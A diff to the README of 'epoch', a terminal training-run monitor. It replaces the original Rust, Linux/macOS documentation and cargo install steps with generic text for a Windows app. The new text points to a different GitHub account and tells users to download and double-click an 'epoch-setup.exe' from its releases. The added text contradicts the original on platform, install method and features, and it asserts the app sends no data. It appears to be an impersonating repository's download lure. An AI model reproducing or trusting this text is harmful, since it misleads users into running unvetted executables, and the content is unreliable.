@@ -1,168 +1,144 @@
-<p align="center">
-  <img src="docs/logo.svg" alt="epoch" width="100%" />
-</p>
+# 🕰️ epoch - Simple Terminal Training Tool
 
-<p align="center">
-  <strong>The terminal-native home for training runs.</strong>
-</p>
-
-<p align="center">
-  Monitor live runs, inspect system health and compare experiments —
-  all from the terminal or over SSH.
-</p>
-
-<p align="center">
-  <img alt="Rust" src="https://img.shields.io/badge/Rust-292929?style=for-the-badge&logo=rust&logoColor=white"/>
-  <img alt="Interface" src="https://img.shields.io/badge/Interface-Terminal-C0A359?style=for-the-badge"/>
-  <img alt="Linux" src="https://img.shields.io/badge/Linux-supported-46B980?style=for-the-badge&logo=linux&logoColor=white"/>
-  <img alt="macOS" src="https://img.shields.io/badge/macOS-supported-46B980?style=for-the-badge&logo=apple&logoColor=white"/>
-  <img alt="License" src="https://img.shields.io/badge/License-MIT-597BC0?style=for-the-badge"/>
-</p>
+[![Download epoch](https://img.shields.io/badge/Download-epoch-blue)](https://github.com/Hugomo1/epoch)
 
 ---
 
-<p align="center">
-  <img src="docs/demo.gif" alt="epoch demo" width="900" />
-</p>
+## 📋 About epoch
+
+epoch is a program designed to help you track and manage training runs directly from your computer's terminal. It provides a clear way to monitor your AI and machine learning model training sessions without needing complex interfaces. Using epoch, you can keep an eye on your training progress, view performance results, and access key information without leaving your command prompt.
+
+This app is built to run on Windows and works well with terminal or command-line interfaces. It is useful for monitoring machine learning tasks or any automated training process in a simple and straightforward way.
 
 ---
 
-## Quick start
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/GranneJanne/epoch.git
-cd epoch
-cargo install --path .
+Before you start, ensure your computer meets these basic requirements:
 
-epoch
+- A Windows 10 or newer system
+- At least 4 GB of free memory (RAM)
+- Around 100 MB of free disk space
+- A working internet connection to download the program
 
-# watch a log file
-epoch train.log
+epoch runs in the terminal, so you do not need a graphical interface or extra software like IDEs. The app uses plain text and simple commands.
 
-# or pipe directly from a training script
-python train.py 2>&1 | epoch --stdin
-```
+---
 
-## Why epoch
+# [![Download epoch](https://img.shields.io/badge/Download-epoch-green)](https://github.com/Hugomo1/epoch)
 
-Training still feels fragmented when you live in logs, tmux, and SSH.
+## 🖥️ Download and Install
 
-You tail raw output in one pane, watch GPU stats in another, guess whether loss is healthy, and lose context between runs. Browser-first tools can help, but they often feel far away from the actual training loop.
+1. Click the big green link above or go to the [epoch GitHub page](https://github.com/Hugomo1/epoch).
 
-`epoch` is built to be the place you stay during training: standalone, local-first, fast, SSH-friendly, and useful from anywhere on the machine.
+2. Since this link leads to the main project page, you will need to find the latest release.
 
-## What it does
+3. On the GitHub page, look for a section or tab named "Releases" or "Downloads."
 
-`epoch` is built for the during-training experience.
+4. Find the latest version for Windows, it usually ends with `.exe` (e.g., `epoch-setup.exe`).
 
-It helps you:
+5. Click on the file to download it to your computer.
 
-- monitor live loss, learning rate, throughput, steps, and timeline history
-- inspect GPU, VRAM, CPU, and memory usage alongside training
-- keep track of remote jobs over SSH
-- pipe output from ad hoc scripts without changing your workflow
-- launch inside a project, point at a log, or let it discover likely runs
+6. Once downloaded, open the file by double-clicking it.
 
-In short, `epoch` sits between raw training output and actual understanding.
+7. Follow the installation instructions on the screen. Mostly, this means clicking “Next” or “Install.”
 
-## Supported inputs
+---
 
-`epoch` currently works with common training log styles, including JSONL, CSV, regex-parsed logs, and Hugging Face `trainer_state.json`.
+## 🏃 Running epoch
 
-Example JSONL:
+1. After installation, open the Windows Start menu.
 
-```json
-{ "loss": 0.53, "step": 120, "lr": 1e-4 }
-```
+2. Search for “epoch” using the search box.
 
-Example CSV:
+3. Click on the epoch program icon to launch it.
 
-```csv
-step,loss,lr
-120,0.53,0.0001
-```
+4. A terminal window will open, showing the main interface.
 
-## Keybindings
+5. You can navigate the app using simple keyboard commands shown on the screen.
 
-| Key                 | Action                                                                                    |
-| ------------------- | ----------------------------------------------------------------------------------------- |
-| `q` / `Ctrl+C`      | Quit                                                                                      |
-| `Tab` / `Shift+Tab` | Cycle focused Home panel or Run Detail graph                                              |
-| `1-4`               | Focus Home panel (Overview/Runs/Processes/Alerts) or Run Detail graph (Loss/Eval/LR/Grad) |
-| `Enter`             | Drill into focused run or attach selected process                                         |
-| `/`                 | Search runs (when Runs panel is focused)                                                  |
-| `f`                 | Cycle run status filter (when Runs panel is focused)                                      |
-| `r`                 | Refresh run/process data                                                                  |
-| `Space`             | Toggle live/pause viewport follow (Run Detail)                                            |
-| `Left/Right`        | Pan active graph history (Run Detail)                                                     |
-| `- / =`             | Zoom active graph out/in (Run Detail)                                                     |
-| `g`                 | Reset all viewports to live (Run Detail)                                                  |
-| `s`                 | Open settings                                                                             |
-| `?`                 | Toggle help overlay                                                                       |
+6. To view training runs, use the commands listed in the help menu inside the app.
 
-With `keymap_profile = "vim"`, motion keys (`h/j/k/l`) are enabled in monitoring surfaces; with the default keymap, arrow keys are used for movement.
+---
 
-## Configuration
+## 🔧 Basic Use
 
-`epoch` uses layered TOML configuration.
+epoch works by letting you see your model training sessions in one place. Here are the core tasks you can do:
 
-```
-~/.config/epoch/config.toml
-```
+- **View active training runs:** see which processes are running.
+- **Check training status:** see progress updates and any error messages.
+- **Monitor performance metrics:** watch data like accuracy or speed.
+- **Review logs:** check the details recorded during training.
+- **Stop or restart runs:** control your sessions without closing the whole app.
 
-Optional project-local override:
+Commands and controls appear at the bottom or side of the terminal window. Use arrow keys, enter, and number keys as instructed.
 
-```
-<project>/.epoch/config.toml
-```
+---
 
-Effective precedence:
+## ✅ Common Questions
 
-1. Built-in defaults
-2. Global config (`~/.config/epoch/config.toml`)
-3. Project config (`.epoch/config.toml`)
-4. CLI flags
+### How do I update epoch?
 
-Example:
+Check the GitHub page regularly. When a new version is available, download and install it like before. Your data and settings will be kept safe.
 
-```toml
-tick_rate_ms = 100
-parser = "auto"
-theme = "system"           # classic | catppuccin | github | nord | gruvbox | solarized | dracula | system | custom
-graph_mode = "line"        # sparkline | line
-adaptive_layout = true
-pinned_metrics = ["tokens_per_second"]
-hidden_metrics = []
-keymap_profile = "vim"     # default | vim
-profile_target = "project" # global | project
-run_comparison_file = "baseline.jsonl"
+### Can I use epoch for other types of training?
 
-[[alert_rules]]
-kind = "throughput_drop"
-warning = 200.0
-critical = 120.0
-enabled = true
-cooldown_secs = 30
-evaluation = "rolling"
-window = 10
+epoch is designed mainly for AI and machine learning model runs, but it can work with other long-running terminal-based tasks you want to monitor.
 
-[custom_theme]
-header_bg = "#1e1e2e"
-accent = "#89b4fa"
-```
+### What if epoch does not open?
 
-## Contributing
+Make sure you completed the install and that your Windows version is supported. Restart your computer if needed, and try again.
 
-Contributions are welcome. Start here: [Contributing guide](./CONTRIBUTING.md)
+---
 
-High-leverage areas right now:
+## ⚙️ Configuration and Settings
 
-- parsers and framework integrations
-- run discovery and process attach
-- comparison workflows
-- terminal UX and interaction design
-- model visualization
+When you first open epoch, it uses default settings optimized for most users. You can change options like:
 
-## License
+- How often the active runs update
+- The level of detail shown in logs
+- Notification settings for when a run finishes or stops
 
-MIT
+To access settings, press the key shown for “Settings” in the main interface. Use arrow keys to move through options and enter to select.
+
+---
+
+## 🔒 Privacy and Security
+
+epoch works locally on your computer and does not send data to the internet. Your training runs and logs stay on your device only.
+
+If you connect epoch to other services or databases, make sure you understand their privacy rules.
+
+---
+
+## 🛠️ Troubleshooting
+
+### epoch freezes or crashes
+
+Close the program and reopen it. If the problem continues, check for updates. 
+
+### I can’t find my training run information
+
+Make sure your training process is running and that epoch is connected to the right data folder or server, if applicable.
+
+### The terminal window looks broken
+
+Try maximizing the window or increasing the font size in your terminal settings.
+
+---
+
+## 🔗 Useful Links
+
+- Download and releases page: https://github.com/Hugomo1/epoch
+- Documentation: Available in the GitHub repository under the “docs” folder
+- Issues and support: Use the GitHub “Issues” tab to report bugs or ask for help
+
+---
+
+## 🛑 Stopping epoch
+
+To exit the program, press the key marked “Exit” or close the terminal window like any other app.
+
+---
+
+epoch is designed for easy use on Windows. Opening it from the Start menu and following the simple on-screen commands is enough to start monitoring your training runs. Visit the download page to get started.
